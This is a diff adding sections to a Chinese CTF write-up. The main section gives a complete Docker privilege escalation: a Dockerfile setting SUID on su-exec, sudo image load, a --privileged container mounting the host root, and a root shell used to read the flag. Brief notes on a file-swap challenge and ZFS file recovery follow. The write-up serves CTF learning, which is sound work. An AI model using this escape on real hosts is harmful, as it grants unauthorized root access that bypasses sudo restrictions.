@@ -734,3 +734,78 @@ if __name__ == "__main__":
     main()
 ```
 
+# Docker for Everyone Plus
+
+观察 `sudo -l` 的输出，发现 `user` 用户可以执行 `docker image load`，但 `docker run` 不能指定 `root` 用户
+
+> - 允许操作
+>   - 加载任意镜像（`docker image load`）
+>   - 以 UID 1000 运行容器（`docker run -u 1000:1000`）
+> - 禁止操作
+>   - 直接以 root 运行容器（`-u root` 被限制）
+
+由于构建docker镜像时，拥有该镜像的root权限，所以可以使用chmod+e，使用该命令对exec进行提权（root权限），然后使用exec开启新的shell，在该shell中的权限即为root权限，在该shell中访问挂载的根目录即可。
+
+1. **构建阶段特权**：Dockerfile 执行时默认以 root 运行，可设置任意文件权限
+2. **SUID 权限传递**：通过 `chmod +s` 设置的权限会固化在镜像中
+3. **运行时权限继承**：即使容器以 UID 1000 运行，仍可执行已设 SUID 的程序
+
+构建恶意镜像：
+
+```dockerfile
+FROM alpine:latest
+RUN apk add --no-cache su-exec      # 1. 安装 su-exec 工具
+RUN chmod +s /sbin/su-exec          # 2. 以 root 身份设置 SUID 权限
+```
+
+```bash
+# 构建镜像
+docker build -t privesc-image .
+
+# 导出镜像为 tar 包
+docker save privesc-image > privesc-image.tar
+
+# 通过 ZModem 上传至目标服务器
+rz privesc-image.tar
+```
+
+```bash
+# 加载镜像（利用 sudo 权限）
+sudo docker image load < privesc-image.tar
+
+# 运行容器并挂载宿主机根目录
+sudo docker run --rm -u 1000:1000 -it --privileged -v /:/host:ro privesc-image
+```
+
+| 参数            | 作用                                 |
+| --------------- | ------------------------------------ |
+| `-u 1000:1000`  | 符合 sudo 权限限制，以普通用户运行   |
+| `--privileged`  | 突破容器权限隔离，允许挂载宿主机设备 |
+| `-v /:/host:ro` | 将宿主机根目录挂载到容器的 `/host`   |
+
+```bash
+# 在容器内执行
+exec su-exec root /bin/ash     # 利用 SUID 权限获取 root shell
+cat /host/flag      # 读取宿主机根目录下的 flag
+```
+
+1. **权限继承**：`su-exec` 的 SUID 权限使普通用户（UID 1000）可临时获得 root 权限
+2. **路径穿透**：通过挂载的 `/host` 路径直接访问宿主机文件系统
+
+# 看不见的彼方：交换空间
+
+题目要求两个程序将各子目录下的文件交换，并且有使用磁盘大小和内存大小的限制，解决办法是将文件切分，分批交换，可使用http协议或者使用共享内存和消息队列实现。
+
+# ZFS 文件恢复
+
+涉及到ZFS的相关知识点，这里写一下粗略的理解
+
+ZFS文件系统会将删除操作记为修改，类似于git中的历史版本记录，故可以通过查看对文件的修改记录，来获取删除的内容；
+
+其中使用zdb命令来查看文件系统的相关信息：
+
+步骤：
+
+1. 获取删除队列
+2. 在删除队列中获取删除的文件denode number
+3. 读取相关文件信息
